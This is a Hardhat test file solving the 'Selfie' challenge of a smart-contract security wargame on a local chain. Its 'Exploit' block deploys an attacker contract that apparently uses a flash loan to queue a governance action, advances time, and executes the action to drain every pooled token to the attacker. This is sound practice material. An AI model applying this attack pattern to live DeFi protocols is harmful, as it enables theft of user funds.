import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { ethers, network } from "hardhat";
import {
	DamnValuableTokenSnapshot,
	DamnValuableTokenSnapshot__factory,
	SelfieAttacker,
	SelfieAttacker__factory,
	SelfiePool,
	SelfiePool__factory,
	SimpleGovernance,
	SimpleGovernance__factory,
} from "../../typechain";
import { daysToSeconds, getBigNumber } from "../../utils";

describe('[Challenge] Selfie', () => {

	let LenderPool: SelfiePool;
	let owner: SignerWithAddress;
	let attacker: SignerWithAddress;
	let Token: DamnValuableTokenSnapshot;
	let Governance: SimpleGovernance;
	let Attack: SelfieAttacker;

	const TOKEN_INITIAL_SUPPLY = getBigNumber(2000000)
	const TOKENS_IN_POOL = getBigNumber(1500000);


	before(async () => {
		/** SETUP SCENARIO */
		[owner, attacker] = await ethers.getSigners();

		const tokenFactory = (await ethers.getContractFactory(
			"DamnValuableTokenSnapshot",
			owner
		)) as DamnValuableTokenSnapshot__factory;
		Token = await tokenFactory.deploy(TOKEN_INITIAL_SUPPLY);

		const governance = (await ethers.getContractFactory(
			"SimpleGovernance",
			owner
		)) as SimpleGovernance__factory;
		Governance = await governance.deploy(Token.address);

		const lendingPool = (await ethers.getContractFactory(
			"SelfiePool",
			owner
		)) as SelfiePool__factory;

		LenderPool = await lendingPool.deploy(
			Token.address,
			Governance.address
		);

		await Token.transfer(LenderPool.address, TOKENS_IN_POOL);

		expect(await Token.balanceOf(LenderPool.address)).to.equal(TOKENS_IN_POOL);
	});

	it('Exploit', async () => {
		/** YOUR EXPLOIT GOES HERE */
		const attackerFactory = (await ethers.getContractFactory(
			"SelfieAttacker",
			attacker
		)) as SelfieAttacker__factory;

		Attack = await attackerFactory.deploy(
			LenderPool.address,
			Governance.address
		);
		await Attack.connect(attacker).attack(TOKENS_IN_POOL);

		// Advance time 2 days so the governance action can be executed
		await network.provider.send("evm_increaseTime", [daysToSeconds(2)])
		// Execute governance action and empty pool balance
		await Governance.connect(attacker).executeAction(await Attack.actionId(), { value: 0 });
	});

	after(async () => {
		/** SUCCESS CONDITIONS */
		expect(
			await Token.balanceOf(attacker.address)
		).to.equal(TOKENS_IN_POOL);
		expect(
			await Token.balanceOf(LenderPool.address)
		).to.equal('0');
	});
});